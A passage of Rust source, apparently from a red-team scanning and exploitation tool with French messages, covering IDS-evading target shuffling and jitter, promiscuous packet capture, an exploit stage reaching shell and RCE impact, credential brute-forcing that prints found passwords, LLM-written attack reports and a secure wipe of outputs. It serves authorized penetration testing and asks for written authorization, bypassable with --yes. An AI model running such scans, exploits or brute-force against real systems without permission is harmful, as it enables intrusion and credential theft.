            stealth_cfg.jitter_max_ms
        );
        if cli.stealth == "redteam" {
            println!(
                "   ⚠️  STEALTH=REDTEAM: low & slow — ETA ~{}s",
                targets.len().saturating_mul(
                    (stealth_cfg.jitter_min_ms + stealth_cfg.jitter_max_ms) as usize / 2
                ) / 1000
            );
        }

        let cve_db_arc = std::sync::Arc::new(cve_db.clone());
        let risk_arc = std::sync::Arc::new(risk_rules.clone());
        let verify_tls_flag = cli.verify_tls;
        let stealth_cfg_c = stealth_cfg.clone();
        let seed_for_shuffle = {
            use std::hash::{DefaultHasher, Hasher};
            let mut h = DefaultHasher::new();
            h.write_u64(
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis() as u64)
                    .unwrap_or(0),
            );
            for t in &targets {
                h.write(t.as_bytes());
            }
            h.finish()
        };

        // ── Shuffle targets order (prevents IDS linear burst on IP ranges) ──
        let mut shuffled_targets = targets.clone();
        shuffle_with_seed_rt(&mut shuffled_targets, seed_for_shuffle);

        let dashboard_emit_owned: Option<crate::live_dashboard::DashboardEmitter> = emit.clone();

        let results: Vec<Option<(GraphNode, ScanTargetSummary)>> =
            futures::stream::iter(shuffled_targets.into_iter().enumerate())
                .map(move |(idx, t)| {
                    let cve_db_c = cve_db_arc.clone();
                    let risk_c = risk_arc.clone();
                    let stealth = stealth_cfg_c.clone();
                    let progress_c = progress_counter.clone();
                    let reach_c = reachable_counter.clone();
                    let cve_c = cve_counter_accum.clone();
                    let emit_for_stream: Option<crate::live_dashboard::DashboardEmitter> =
                        dashboard_emit_owned.clone();
                    async move {
                        // Pacing: jitter BEFORE connect, except for the very first target
                        if idx > 0 && (stealth.jitter_min_ms > 0 || stealth.jitter_max_ms > 0) {
                            let jitter_ms = if stealth.jitter_min_ms == stealth.jitter_max_ms {
                                stealth.jitter_min_ms
                            } else {
                                use rand::Rng;
                                rand::thread_rng()
                                    .gen_range(stealth.jitter_min_ms..=stealth.jitter_max_ms)
                            };
                            if jitter_ms > 0 {
                                tokio::time::sleep(std::time::Duration::from_millis(jitter_ms))
                                    .await;
                            }
                        }
                        let out = scan_single_target(
                            &t,
                            &cve_db_c,
                            &risk_c,
                            http_t,
                            tcp_t,
                            verify_tls_flag,
                        )
                        .await;
                        // ── QW5 Live Dashboard: push immédiat + compteurs atomiques
                        progress_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                        if let Some((ref node, _ref_sum)) = out.as_ref() {
                            if node.reachable {
                                reach_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                            }
                            if !node.cves.is_empty() {
                                cve_c.fetch_add(
                                    node.cves.len(),
                                    std::sync::atomic::Ordering::Relaxed,
                                );
                            }
                            if let Some(e) = emit_for_stream.as_ref() {
                                e.send_node(node).await;
                            }
                        }
                        out
                    }
                })
                .buffer_unordered(concurrency)
                .collect()
                .await;

        for result in results {
            if let Some((n, s)) = result {
                node_extras.insert(n.id.clone(), NodeExtra::default());
                nodes.push(n);
                summaries.push(s);
            }
        }
        // --- Enhanced enrichment pass (WAF / OS / Tech) using banners + headers ---
        enrich_extras(&mut node_extras, &nodes);

        let reachable_count = nodes.iter().filter(|n| n.reachable).count();
        println!(
            "✅ {} node{} scanned successfully ({} unreachable)",
            reachable_count,
            if reachable_count == 1 { "" } else { "s" },
            nodes.len() - reachable_count
        );
        scan_info!(
            nodes = nodes.len(),
            reachable = reachable_count,
            "scans complete"
        );
    }

    // -----------------------------------------------------------
    // 2b. Join the live capture thread (it ran concurrently with the scan)
    // -----------------------------------------------------------
    // In scan mode, stop the capture early (scan is done).
    // In capture-only mode (no targets), let it run its full duration.
    if !targets.is_empty() {
        cap_stop.store(true, std::sync::atomic::Ordering::Release);
    }
    let live_capture_links: Option<Vec<FlowLink>> = match cap_handle {
        Some(handle) => match handle.join() {
            Ok(Ok(cr)) => {
                let iface_label = cap_iface_for_log.as_deref().unwrap_or(&cr.interface);
                println!(
                    "   ✓ {} packet(s) captured, {} flow(s) on {}",
                    cr.total_packets,
                    cr.flows.len(),
                    iface_label
                );
                scan_info!(
                    packets = cr.total_packets,
                    flows = cr.flows.len(),
                    interface = cr.interface,
                    "capture success"
                );
                // ── Display captured flows (top 30 by packet count) ──
                if !cr.flows.is_empty() {
                    let mut sorted = cr.flows.clone();
                    sorted.sort_by(|a, b| b.packets.cmp(&a.packets).then(b.bytes.cmp(&a.bytes)));
                    println!("   ── Captured flows (top {}) ──", sorted.len().min(30));
                    for f in sorted.iter().take(30) {
                        let sp = f
                            .src_port
                            .map(|p| p.to_string())
                            .unwrap_or_else(|| "-".into());
                        let dp = f
                            .dst_port
                            .map(|p| p.to_string())
                            .unwrap_or_else(|| "-".into());
                        let proto = f.protocol.to_uppercase();
                        let banner = f.app_banner.as_deref().unwrap_or("");
                        let bshort = if banner.len() > 60 {
                            &banner[..60]
                        } else {
                            banner
                        };
                        println!(
                            "     {:5} {:>4}:{} → {}:{}  [{} pkts / {} bytes] {}",
                            proto, f.src_ip, sp, f.dst_ip, dp, f.packets, f.bytes, bshort
                        );
                    }
                }
                if let Some(out_path) = &cap_output_path {
                    if let Err(e) = write_capture_json(&cr, out_path) {
                        eprintln!("⚠️  Failed to write capture JSON {}: {}", out_path, e);
                    } else {
                        println!("   💾 Raw capture: {}", out_path);
                    }
                }
                let links = capture_to_links(&cr);
                if links.is_empty() {
                    None
                } else {
                    Some(links)
                }
            }
            Ok(Err(e)) => {
                scan_error!(err=%e, "capture failed");
                eprintln!("⚠️  Capture failed (proceeding without it): {}", e);
                None
            }
            Err(e) => {
                eprintln!("⚠️  Capture thread panicked: {:?}", e);
                None
            }
        },
        None => None,
    };

    // -----------------------------------------------------------
    // 3. Topology links
    // -----------------------------------------------------------
    let capture_merged = merge_links(captured_links, live_capture_links.unwrap_or_default());
    let links = if cli.no_infer {
        capture_merged
    } else {
        let inferred = infer_links_from_targets(&summaries);
        merge_links(Some(capture_merged), inferred)
    };
    println!(
        "🔗 {} topology link{}",
        links.len(),
        if links.len() == 1 { "" } else { "s" }
    );

    let total_cves: usize = nodes.iter().map(|n| n.cves.len()).sum();
    println!(
        "🔓 {} CVE{} matched to service versions",
        total_cves,
        if total_cves == 1 { "" } else { "s" }
    );

    // -----------------------------------------------------------
    // 4. Capture-only ghost nodes
    // -----------------------------------------------------------
    let mut nodes = nodes;
    let links = links;
    {
        let mut seen_ids: HashSet<String> = nodes.iter().map(|n| n.id.clone()).collect();
        for l in &links {
            for endpoint in [&l.source, &l.target] {
                if !seen_ids.contains(endpoint) {
                    seen_ids.insert(endpoint.clone());
                    let (host, port) = split_host_port(endpoint);
                    let risk_by_port = match port {
                        21 | 22 | 23 | 3389 => 4,
                        25 | 53 | 80 | 110 | 143 | 443 | 8080 => 3,
                        1433 | 3306 | 5432 | 6379 | 27017 => 4,
                        _ => 2,
                    };
                    let proto = if port == 0 { "ip" } else { "capture" }.to_string();
                    let port_str = if port == 0 {
                        "any".into()
                    } else {
                        port.to_string()
                    };
                    nodes.push(GraphNode {
                        id: endpoint.clone(),
                        label: format!("Host {} [captured]", endpoint),
                        risk: risk_by_port,
                        services: vec![format!("{}/{}", proto, port_str)],
                        banner: "captured-flow".to_string(),
                        version: "n/a".to_string(),
                        protocol: proto,
                        product: "captured".to_string(),
                        cves: vec![],
                        risk_reasons: vec![
                            "Discovered via live packet capture (promiscuous mode)".into()
                        ],
                        host,
                        port,
                        reachable: true,
                        ..Default::default()
                    });
                    node_extras.insert(endpoint.clone(), NodeExtra::default());
                }
            }
        }
    }

    // -----------------------------------------------------------
    // 5. Load exploit manifest + run orchestrator (dry-run or live)
    // -----------------------------------------------------------
    let manifest: ExploitManifest = load_manifest(&runtime.exploits_path).unwrap_or_else(|e| {
        eprintln!(
            "⚠️  Could not load exploit manifest ({}): {} — using bundled minimal fallback",
            runtime.exploits_path, e
        );
        exploits::default_signatures()
    });

    // ── Confirmation de sécurité avant exploits actifs ─────────────────────
    if !runtime.pentest.dry_run && !cli.yes {
        let impact_label = match runtime.pentest.max_exploit_impact {
            exploits::ImpactLevel::Informational => {
                "INFORMATIONAL (banners, headers — sans side-effect)"
            }
            exploits::ImpactLevel::CredHarvest => {
                "CRED_HARVEST (tests d'auth anonymes/basiques, leak d'info)"
            }
            exploits::ImpactLevel::Shell => {
                "SHELL (déclenche backdoors, accès interactif si disponible)"
            }
            exploits::ImpactLevel::Rce => {
                "RCE ⚠️ EXÉCUTION DE CODE À distance (MySQL root, VSFTPD smiley, etc.)"
            }
        };
        eprintln!("\n╔══════════════════════════════════════════════════════════════╗");
        eprintln!("║  ⚠️  ATTENTION — EXPLOITS ACTIFS                              ║");
        eprintln!("║                                                              ║");
        eprintln!("║  --run-exploits est activé. Des probes réseau RÉELS vont     ║");
        eprintln!("║  être envoyés aux cibles suivantes :                         ║");
        for t in &targets {
            eprintln!("║    • {:<56}║", t);
        }
        eprintln!("║                                                              ║");
        eprintln!(
            "║  --max-exploit-impact = {:<38}║",
            &impact_label[..impact_label.len().min(38)]
        );
        eprintln!("║                                                              ║");
        eprintln!("║  Assurez-vous d'avoir une AUTORISATION ÉCRITE explicite.     ║");
        eprintln!("║  Utilisez --yes pour bypasser cette confirmation.            ║");
        eprintln!("╚══════════════════════════════════════════════════════════════╝");
        eprint!("\n  Confirmer ? [oui/NON] : ");
        let mut response = String::new();
        std::io::stdin().read_line(&mut response).unwrap_or(0);
        let response = response.trim().to_lowercase();
        if response != "oui" && response != "o" && response != "yes" && response != "y" {
            eprintln!("❌ Annulé. Relancez sans --run-exploits pour un scan passif.");
            return Ok(());
        }
        eprintln!("✅ Confirmation reçue — exploits actifs démarrés.");
    }

    let mode_label = match (runtime.pentest.dry_run, runtime.pentest.max_exploit_impact) {
        (true, _) => "SAFE DRY-RUN",
        (false, exploits::ImpactLevel::Informational) => "ACTIVE · impact=INFO",
        (false, exploits::ImpactLevel::CredHarvest) => "ACTIVE · impact=CRED ⚠",
        (false, exploits::ImpactLevel::Shell) => "ACTIVE · impact=SHELL ⚠⚠",
        (false, exploits::ImpactLevel::Rce) => "ACTIVE · impact=RCE ⚠⚠⚠",
    };
    // Deux compteurs distincts, volontairement affichés ensemble : le nombre de
    // signatures chargées (manifeste) et le nombre retenu par le gating
    // service/port/version/depth (ce qui est réellement évalué). Un manifeste
    // chargé mais intégralement filtré n'apparaît plus comme une incohérence.
    let reachable_count = nodes.iter().filter(|n| n.reachable).count();
    let applicable = exploits::count_applicable(&nodes, &manifest, runtime.pentest.exploit_depth);
    println!("\n⚔️  Exploit stage: {} signature(s) loaded · {} applicable(s) sur {} host(s) joignable(s) · {}",
        manifest.signatures.len(),
        applicable,
        reachable_count,
        mode_label
    );
    if applicable == 0 {
        println!("   \x1b[90m[i]\x1b[0m gating service/port/version/depth : aucune signature ne cible les services détectés");
    }
    let exploit_findings: HashMap<String, Vec<ExploitFinding>> =
        run_pentest_all(&nodes, &manifest, &runtime.pentest).await;
    let pentest_summary: PentestSummary = summarize(&exploit_findings);
    println!(
        "   Exploits: {} signatures·evaluated | {} would_run | {} vulnerable | {} not_vulnerable | {} errors | {} skipped",
        pentest_summary.total_signatures, pentest_summary.would_run, pentest_summary.vulnerable,
        pentest_summary.not_vulnerable, pentest_summary.errors, pentest_summary.skipped
    );
    scan_info!(
        signatures = pentest_summary.total_signatures,
        applicable = applicable,
        executed = pentest_summary.executed,
        vulnerable = pentest_summary.vulnerable,
        would_run = pentest_summary.would_run,
        dry_run = runtime.pentest.dry_run,
        "pentest complete"
    );

    // -----------------------------------------------------------
    // 5b. Bruteforce pass (opt-in via --brute)
    // -----------------------------------------------------------
    let mut brute_findings: Vec<crate::bruteforce::BruteReport> = Vec::new();
    if !cli.brute && (cli.brute_users.is_some() || cli.brute_passwords.is_some()) {
        eprintln!("  ⚠️  --brute-users/--brute-passwords ignorés : --brute est inactif.");
    }

    if cli.brute {
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let mut do_brute = cli.yes;

        // Safety confirmation
        if !do_brute {
            eprintln!("\n╔══════════════════════════════════════════════════════════════╗");
            eprintln!("║  ⚠️  ATTENTION — BRUTEFORCE ACTIF                             ║");
            eprintln!("║  Des tentatives de connexion réelles vont être envoyées.      ║");
            eprintln!("║  Assurez-vous d'avoir une AUTORISATION ÉCRITE explicite.      ║");
            eprintln!("║  Utilisez --yes pour bypasser cette confirmation.             ║");
            eprintln!("╚══════════════════════════════════════════════════════════════╝");
            eprint!("\n  Confirmer bruteforce ? [oui/NON] : ");
            let mut response = String::new();
            std::io::stdin().read_line(&mut response).unwrap_or(0);
            do_brute = ["oui", "o", "yes", "y"].contains(&response.trim().to_lowercase().as_str());
            if !do_brute {
                eprintln!("❌ Bruteforce annulé.");
            }
        }

        if do_brute {
            let mut brute_cfg = match cli.brute_mode.as_str() {
                "stealth" => crate::bruteforce::BruteConfig::stealth(),
                "default" => crate::bruteforce::BruteConfig::default(),
                _ => crate::bruteforce::BruteConfig::quick(),
            };
            brute_cfg.auto_install = cli.auto_install;
            brute_cfg.assume_yes = cli.yes;

            // Listes externes (txt) : ajoutées aux listes embarquées, ou
            // substituées avec --brute-lists-replace. Une erreur de lecture
            // annule la phase de bruteforce sans perdre les résultats du scan.
            let mut lists_ok = true;
            for (flag, file, users) in [
                ("--brute-users", cli.brute_users.as_deref(), true),
                ("--brute-passwords", cli.brute_passwords.as_deref(), false),
            ] {
                let Some(file) = file else { continue };
                let loaded = if users {
                    brute_cfg.load_users(file, cli.brute_lists_replace)
                } else {
                    brute_cfg.load_passwords(file, cli.brute_lists_replace)
                };
                match loaded {
                    Ok((n, total)) => println!(
                        "  {}▸{} {} « {} » : {} entrées ({} au total)",
                        DIM, RESET, flag, file, n, total
                    ),
                    Err(e) => {
                        eprintln!("  ⚠️  {} : {}", flag, e);
                        lists_ok = false;
                    }
                }
            }
            if !lists_ok {
                eprintln!("  ❌ Bruteforce annulé (listes invalides).");
            } else {
                let reachable_nodes: Vec<&GraphNode> =
                    nodes.iter().filter(|n| n.reachable).collect();
                println!(
                    "\n{BOLD}{fire2}▍ BRUTEFORCE{RESET}  mode={}  targets={}",
                    cli.brute_mode,
                    reachable_nodes.len()
                );

                for node in &reachable_nodes {
                    let svc = node
                        .services
                        .first()
                        .map(|s| s.split('/').next().unwrap_or("tcp"))
                        .unwrap_or("tcp");
                    let is_https = node.protocol == "https" || node.port == 443;
                    print!("  🔑 {}:{}  [{}] … ", node.host, node.port, svc);
                    match crate::bruteforce::auto_brute(
                        &node.host, node.port, svc, is_https, &brute_cfg,
                    )
                    .await
                    {
                        Some(report) => {
                            if report.successes.is_empty() {
                                println!(
                                    "{DIM}no valid creds ({} tried){RESET}",
                                    report.total_tried
                                );
                            } else {
                                println!(
                                    "{BOLD}{fire2}✓ {} credential(s) found!{RESET}",
                                    report.successes.len()
                                );
                                for r in &report.successes {
                                    println!("    {fire2}●{RESET}  user={BOLD}{}{RESET}  pass={BOLD}{}{RESET}",
                                        r.username, r.password);
                                    if let Some(proof) = &r.proof {
                                        println!(
                                            "      {DIM}{}{RESET}",
                                            &proof.chars().take(100).collect::<String>()
                                        );
                                    }
                                }
                                brute_findings.push(report);
                            }
                        }
                        None => println!("{DIM}not bruteforceable{RESET}"),
                    }
                }

                if brute_findings.is_empty() {
                    println!("  {DIM}[ No credentials found ]{RESET}");
                } else {
                    println!(
                        "\n  {BOLD}{fire2}[ {} service(s) with valid credentials ]{RESET}",
                        brute_findings.len()
                    );
                }
            }
        }
    }

    // -----------------------------------------------------------
    // 6. AI enrichment (optional) + QW3: REDACTION BEFORE LLM UPLOAD
    // -----------------------------------------------------------
    let mut ai_report_opt: Option<AiReport> = None;
    let mut ai_analyses: HashMap<String, TargetAnalysis> = HashMap::new();
    if runtime.do_ai {
        // ── QW3: Anonymizer OPSEC (per-defaut: release = STRICT, debug = off) ──
        let effective_redact = if cfg!(debug_assertions) {
            cli.redact_level.clone()
        } else {
            if cli.redact_level.eq_ignore_ascii_case("off") {
                "light".into()
            } else {
                cli.redact_level.clone()
            }
        };
        let level = RedactLevel::from_str(&effective_redact);
        let mut anon = Anonymizer::new(level);
        if !matches!(level, RedactLevel::Off) {
            println!(
                "🧠 AI-OPSEC: redact-level={:?} (IPs/hostnames anonymisés avant envoi LLM)",
                level
            );
        }

        if let Some(cfg) = &runtime.llm {
            match build_client(cfg) {
                Err(e) => {
                    eprintln!("🧠 LLM client build error: {} — skipping AI", e);
                    scan_error!(err=%e, "llm build");
                }
                Ok(client) => {
                    // --- Per-target AI analysis (top N riskiest) ---
                    let mut ordered: Vec<&GraphNode> =
                        nodes.iter().filter(|n| n.reachable).collect();
                    ordered.sort_by(|a, b| {
                        b.risk
                            .cmp(&a.risk)
                            .then_with(|| b.cves.len().cmp(&a.cves.len()))
                    });
                    ordered.truncate(runtime.ai_targets.max(0));
                    if !ordered.is_empty() {
                        println!("\n🧠 AI per-target analysis (top {}):", ordered.len());
                        for (idx, n) in ordered.iter().enumerate() {
                            let extra = node_extras.get(&n.id).cloned().unwrap_or_default();
                            let cve_tuples: Vec<(String, f32, String)> = n
                                .cves
                                .iter()
                                .map(|(id, sev, desc, _extra)| (id.clone(), *sev, desc.clone()))
                                .collect();
                            let prior = exploit_findings
                                .get(&n.id)
                                .map(|v| {
                                    v.iter()
                                        .filter(|f| {
                                            matches!(
                                                f.outcome,
                                                exploits::ExploitOutcome::Vulnerable
                                            )
                                        })
                                        .count()
                                })
                                .unwrap_or(0);

                            // ── QW3: Redaction des PII avant envoi ─────────────────
                            let host_safe = anon.redact_host(&n.host);
                            let banner_raw = n.banner.clone();
                            let banner_safe = anon.anonymize_text(&banner_raw);
                            let product_safe = anon.anonymize_text(&n.product);
                            let version_safe = n.version.clone();
                            let os_safe = extra.os_guess.clone().map(|s| anon.anonymize_text(&s));
                            let waf_safe = extra.waf.clone().map(|s| anon.anonymize_text(&s));
                            let tech_safe =
                                extra.tech_stack.clone().map(|s| anon.anonymize_text(&s));
                            let svc_label = n.services.first().cloned().unwrap_or_default();

                            print!(
                                "   ({}/{}) {}:{} … ",
                                idx + 1,
                                ordered.len(),
                                if matches!(level, RedactLevel::Off) {
                                    n.host.as_str()
                                } else {
                                    &host_safe
                                },
                                n.port
                            );
                            match analyze_target(
                                client.as_ref(),
                                &host_safe,
                                n.port,
                                &svc_label,
                                &product_safe,
                                &version_safe,
                                Some(&banner_safe),
                                &n.protocol,
                                &cve_tuples,
                                os_safe.as_deref(),
                                waf_safe.as_deref(),
                                tech_safe.as_deref(),
                                prior,
                            )
                            .await
                            {
                                Ok(mut a) => {
                                    a.host = if matches!(level, RedactLevel::Off) {
                                        n.host.clone()
                                    } else {
                                        host_safe.clone()
                                    };
                                    println!(
                                        "conf={:.0}% · expls={}",
                                        a.confidence * 100.0,
                                        a.recommended_exploits.len()
                                    );
                                    ai_analyses.insert(n.id.clone(), a);
                                }
                                Err(e) => {
                                    println!("ERR: {}", split_first_line(&format!("{e}"), 80));
                                    scan_error!(id=%n.id, err=%e, "llm analyze");
                                }
                            }
                        }
                    }
                    // --- Overall AI report ---
                    println!("🧠 AI generating professional attack-surface report … ");
                    let mut flow_types: HashMap<&str, usize> = HashMap::new();
                    for l in &links {
                        *flow_types.entry(&l.link_type).or_default() += 1;
                    }
                    let mut crits: Vec<&GraphNode> = nodes.iter().collect();
                    crits.sort_by(|a, b| {
                        b.risk
                            .cmp(&a.risk)
                            .then_with(|| b.cves.len().cmp(&a.cves.len()))
                    });

                    // ── QW3: Redaction des labels de cibles critiques ────────
                    let crit_labels_raw: Vec<String> =
                        crits.iter().take(10).map(|n| n.id.clone()).collect();
                    let crit_labels_safe: Vec<String> = crit_labels_raw
                        .iter()
                        .map(|id| {
                            let (h, p) = split_host_port(id);
                            let hr = anon.redact_host(&h);
                            if p > 0 {
                                format!("{}:{}", hr, p)
                            } else {
                                hr
                            }
                        })
                        .collect();
                    let crit_labels_refs: Vec<&str> =
                        crit_labels_safe.iter().map(|s| s.as_str()).collect();

                    let md = &reports::build_metadata(&nodes, start.elapsed().as_millis(), None);
                    let mut finding_lines: Vec<String> = Vec::new();
                    for (host_id, finds) in &exploit_findings {
                        for f in finds {
                            if matches!(f.outcome, exploits::ExploitOutcome::Vulnerable) {
                                let proof_raw: String = f
                                    .proof
                                    .as_deref()
                                    .map(|p| p.chars().take(160).collect())
                                    .unwrap_or_else(|| "(no proof)".into());
                                let proof_safe = anon.anonymize_text(&proof_raw);
                                let host_safe_id = {
                                    let (h, p) = split_host_port(host_id);
                                    let hr = anon.redact_host(&h);
                                    if p > 0 {
                                        format!("{}:{}", hr, p)
                                    } else {
                                        hr
                                    }
                                };
                                finding_lines.push(format!(
                                    "- [{sev}] {id} ({cat}) on {host} → {proof}",
                                    sev = f.severity,
                                    id = f.signature_id,
                                    cat = f.category,
                                    host = host_safe_id,
                                    proof = proof_safe
                                ));
                            }
                        }
                    }
                    let findings_block = if finding_lines.is_empty() {
                        "No confirmed vulnerable findings (all probes returned not_vulnerable)."
                            .to_string()
                    } else {
                        finding_lines.join("\n")
                    };
                    let findings_safe = anon.anonymize_text(&findings_block);
                    let custom_ctx_raw = format!(
                        "Engagement scope: {} targets scanned. Metadata version {} generated at {}. Purpose: AUTHORIZED Red Team engagement.\n\nCONFIRMED FINDINGS (ground truth — base report ONLY on these):\n{}",
                        nodes.len(), md.version, md.generated_at, findings_safe
                    );
                    let custom_ctx = anon.anonymize_text(&custom_ctx_raw);

                    let rb = md.risk_breakdown.clone();
                    let overall_risk: f32 = (nodes.iter().map(|n| n.risk as f32).sum::<f32>()
                        / (nodes.len().max(1) as f32))
                        * 1.0;
                    match generate_report(
                        client.as_ref(),
                        overall_risk,
                        nodes.len(),
                        nodes.iter().filter(|n| n.reachable).count(),
                        nodes.iter().flat_map(|n| n.services.iter()).count(),
                        total_cves,
                        rb[4],
                        rb[3],
                        rb[2],
                        rb[0] + rb[1],
                        &flow_types,
                        &crit_labels_refs,
                        pentest_summary.vulnerable,
                        pentest_summary.would_run,
                        runtime.pentest.dry_run,
                        &custom_ctx,
                    )
                    .await
                    {
                        Ok(r) => {
                            println!(
                                "   ✓ executive_summary={} chars, {} top findings",
                                r.executive_summary.chars().count(),
                                r.top_findings.len()
                            );
                            ai_report_opt = Some(r);
                        }
                        Err(e) => {
                            eprintln!("   ✗ LLM report: {}", e);
                            scan_error!(err=%e, "llm report");
                        }
                    }
                }
            }
        }

        // ── QW3: Drop la lookup-table d'anonymisation (OPSEC: ne jamais l'écrire) ──
        drop(anon);
    }

    // -----------------------------------------------------------
    // 7. Build metadata + write graph.json / csv / md (core exports)
    // -----------------------------------------------------------
    let duration_ms = start.elapsed().as_millis();
    let scope_str = {
        let joined = targets.join(", ");
        if joined.chars().count() > 140 {
            joined.chars().take(137).collect::<String>() + "…"
        } else {
            joined
        }
    };
    let metadata = {
        let mut md = build_metadata(&nodes, duration_ms, Some(scope_str));
        md.pentest_summary = serde_json::to_value(PentestSummaryForMeta {
            total_signatures: pentest_summary.total_signatures,
            executed: pentest_summary.executed,
            would_run: pentest_summary.would_run,
            vulnerable: pentest_summary.vulnerable,
            not_vulnerable: pentest_summary.not_vulnerable,
            errors: pentest_summary.errors,
            skipped: pentest_summary.skipped,
            dry_run: runtime.pentest.dry_run,
            severity_count: pentest_summary.severity_count.clone(),
        })
        .ok();
        md.ai_enriched = ai_report_opt.is_some();
        md.ai_targets_analyzed = ai_analyses.len();
        md
    };

    // Attach findings + extras + AI to each GraphNode for JSON consumers.
    // (GraphNode struct itself does not carry these fields, so we wrap them
    // in a separate side-car JSON file.)

    // ── Mission Pack: auto-capture nodes du scan vers pack ouvert ───────────
    if autocapture {
        if let Some(ref mut pack) = maybe_pack {
            use crate::mission_pack::MissionFinding;
            use ansi::*;
            let added_nodes = pack.merge_graph_nodes(&nodes);
            pack.mark_scan_run(Some(&format!(
                "{} cibles, {} nodes détectés, {} nouveaux",
                targets.len(),
                nodes.len(),
                added_nodes
            )));
            // Conversion findings depuis exploit_findings sidecar → pack findings
            for (node_id, findings_list) in &exploit_findings {
                for ef in findings_list {
                    if ef.outcome == crate::exploits::ExploitOutcome::Vulnerable {
                        let f = MissionFinding {
                            id: format!("{}-{}", node_id, ef.signature_id),
                            title: format!(
                                "{} — {}",
                                ef.category,
                                ef.description.chars().take(60).collect::<String>()
                            ),
                            severity: ef.severity.parse::<i32>().unwrap_or(5),
                            description: ef.description.clone(),
                            evidence: vec![ef.proof.clone().unwrap_or_default()],
                            cvss: None,
                            cve_refs: vec![],
                            node_id: Some(node_id.clone()),
                            detected_at: Some(chrono::Utc::now()),
                        };
                        pack.add_finding(f);
                    }
                }
            }
            match pack.persist() {
                Ok(()) => {
                    println!("  {MATRIX}✔{RESET} Mission Pack auto-capture: {CYAN}{added_nodes}{RESET} nouveaux nodes / {n_f} findings fusionnés",
                        added_nodes=added_nodes, n_f=exploit_findings.len());
                }
                Err(e) => println!("  {RED}✗{RESET} Persist Mission Pack: {e}"),
            }
        }
    }

    let graph = ScanGraph {
        nodes: nodes.clone(),
        links: links.clone(),
        metadata: metadata.clone(),
    };
    write_json(&graph, &cli.output)?;
    println!("💾 Graph saved:   {}", cli.output);

    let sidecar_path = sidecar_path_for(&cli.output);
    write_sidecar(
        &sidecar_path,
        &metadata.scan_id,
        &exploit_findings,
        &node_extras,
        &ai_analyses,
        &ai_report_opt,
        &brute_findings,
    )?;
    println!("🧩 Sidecar:        {}", sidecar_path);

    // ── Rapport de pentest professionnel ─────────────────────────────────────
    if cli.pentest_report {
        use crate::report_gen::{
            export_html_report, export_markdown, finding_from_cve, ReportBuilder,
        };
        let client_name = cli.client_name.as_deref().unwrap_or("Client Red Team");
        let mut builder = ReportBuilder::new(client_name, &metadata.scan_id, "Grey Box");

        // Add scope
        for t in &targets {
            builder = builder.add_target(t);
        }

        // Convert CVEs to findings
        for node in &nodes {
            for (cve_id, severity, _desc, _vec) in &node.cves {
                let finding = finding_from_cve(
                    cve_id,
                    cve_id,
                    *severity,
                    &[node.host.clone()],
                    &node.banner,
                );
                builder = builder.add_finding(finding);
            }
        }

        // Add timeline from exploit findings
        use crate::report_gen::TimelineEvent;
        builder = builder.add_event(TimelineEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            phase: "Scan".into(),
            description: format!("{} cibles scannées", targets.len()),
            target: Some(targets.first().cloned().unwrap_or_default()),
            technique: Some("T1046".into()),
        });

        let report = builder.compute_executive_summary().build();

        // Export MD
        let md_path = sibling_path(&cli.output, "pentest.md");
        let html_path = sibling_path(&cli.output, "pentest.html");
        if export_markdown(&report, &md_path).is_ok() {
            println!("📋 Rapport pentest MD  : {}", md_path);
        }
        if export_html_report(&report, &html_path).is_ok() {
            println!("📋 Rapport pentest HTML: {}", html_path);
        }
    }

    if export_csv {
        let csv_path = sibling_path(&cli.output, "csv");
        write_csv(&graph, &csv_path)?;
        println!("📊 CSV report:   {}", csv_path);
    }
    if export_md {
        let md_path = sibling_path(&cli.output, "md");
        write_markdown(&graph, &md_path)?;
        println!("📝 Markdown:     {}", md_path);
    }

    // -----------------------------------------------------------
    // 8. API report export (JSON / HTML standalone) if requested
    // -----------------------------------------------------------
    if runtime.do_api_report {
        let hosts = build_host_reports(&nodes, &node_extras);
        let all_cves: Vec<crate::cve::CveEntry> = collect_unique_cves(&nodes);
        let risk_evals: Vec<(String, i32, Vec<String>)> = nodes
            .iter()
            .map(|n| (n.id.clone(), n.risk as i32, n.risk_reasons.clone()))
            .collect();
        let api = exports::generate_api_report(
            &metadata.scan_id,
            &metadata.scope.clone().unwrap_or_default(),
            &hosts,
            &all_cves,
            &risk_evals,
            &links,
        );
        let json_p = sibling_path(&cli.output, "api.json");
        exports::export_json(&api, &json_p).with_context(|| "writing api json")?;
        println!("📘 API JSON:     {}", json_p);
        let standalone_html_p = sibling_path(&cli.output, "report.html");
        exports::export_html(&api, &standalone_html_p)
            .with_context(|| "writing standalone html")?;
        println!("🌐 Standalone:   {}", standalone_html_p);

        // If AI report exists, also drop a human-friendly AI markdown next to API JSON
        if let Some(ai) = &ai_report_opt {
            let ai_md = render_ai_markdown(ai, &metadata);
            let ai_path = sibling_path(&cli.output, "ai-report.md");
            std::fs::write(&ai_path, ai_md).ok();
            println!("🤖 AI report:    {}", ai_path);
        }
    }

    println!(
        "\n🏁 Done in {:.2}s. Open dashboard.html to visualize.",
        duration_ms as f64 / 1000.0
    );
    scan_info!(
        elapsed_ms = duration_ms,
        outputs = cli.output,
        "run complete"
    );

    // ── Dashboard LIVE: Finished event + hub shutdown gracile ────────────────
    if let Some((emitter, server_handle, stop_notify)) = dashboard_hub_guard.take() {
        let reachable_final = nodes.iter().filter(|n| n.reachable).count();
        emitter
            .send(DashboardEvent::Finished {
                total_nodes: nodes.len(),
                reachable: reachable_final,
                elapsed_ms: duration_ms,
            })
            .await;
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
        stop_notify.notify_one();
        let _ = tokio::time::timeout(std::time::Duration::from_secs(2), server_handle).await;
    }

    // ── QW4: Secure wipe --clean-outputs (3 passes: 0x00, 0xFF, random) ──────
    if cli.clean_outputs.unwrap_or(false) {
        use ansi::*;
        println!();
        println!("  {RED}{BOLD}▍ SECURE WIPE{RESET}  --clean-outputs demandé (3 passes overwrite aléatoire)");
        match secure_wipe_outputs(&cli.output) {
            Ok(n) if n > 0 => {
                println!(
                    "  {MATRIX}✓{RESET}  {} fichier(s) effacé(s) en écriture sécurisée",
                    n
                );
                scan_info!(wiped_files = n, "secure wipe complete");
            }
            Ok(_) => println!("  {GRIS}(aucun fichier à effacer){RESET}"),
            Err(e) => eprintln!("  {AMBER}⚠{RESET}  secure-wipe: {}", e),
        }
    }
    Ok(())
}

// ---------------------------------------------------------------
